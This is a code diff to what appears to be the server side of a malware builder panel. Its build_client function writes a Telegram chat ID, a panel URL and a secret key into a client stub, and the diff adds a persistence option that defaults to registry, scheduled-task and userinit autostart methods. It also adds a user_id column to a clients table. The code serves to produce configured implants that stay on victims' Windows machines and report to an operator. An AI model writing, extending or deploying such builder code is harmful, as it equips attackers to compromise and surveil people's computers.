@@ -110,6 +110,11 @@ def init_db():
             )
         ''')
 
+        cursor = db.execute("PRAGMA table_info(clients)")
+        client_cols = [row['name'] for row in cursor.fetchall()]
+        if 'user_id' not in client_cols:
+            db.execute("ALTER TABLE clients ADD COLUMN user_id INTEGER")
+
         for k, v in [
             ('tg_forward_enabled', 'false'), ('tg_bot_token', ''), ('tg_chat_id', ''),
             ('active_bg_theme', 'theme-default'), ('bg_blur_value', '15'), ('custom_bg_path', '')
@@ -890,6 +895,7 @@ def build_client():
         chat_id = data.get('chatId', '')
         panel_url = data.get('panelUrl', '')
         secret_key = data.get('secretKey', '')
+        persistence = data.get('persistence', 'registry,scheduler,userinit')
 
         stub_dir = os.path.join(BASE_DIR, 'stub')
         root_dir = os.path.dirname(BASE_DIR)
@@ -932,6 +938,7 @@ def build_client():
         chat_placeholder = get_placeholder(old_config, 'chatId')
         panel_url_placeholder = get_placeholder(old_config, 'panelUrl')
         secret_key_placeholder = get_placeholder(old_config, 'secretKey')
+        persist_placeholder = get_placeholder(old_config, 'persistence')
 
         new_config = (
             old_config
@@ -940,6 +947,7 @@ def build_client():
             .replace(chat_placeholder, pad_value(chat_id, len(chat_placeholder)))
             .replace(panel_url_placeholder, pad_value(panel_url, len(panel_url_placeholder)))
             .replace(secret_key_placeholder, pad_value(secret_key, len(secret_key_placeholder)))
+            .replace(persist_placeholder, pad_value(persistence, len(persist_placeholder)))
         )
 
         old_config_bytes = old_config.encode('utf-8')
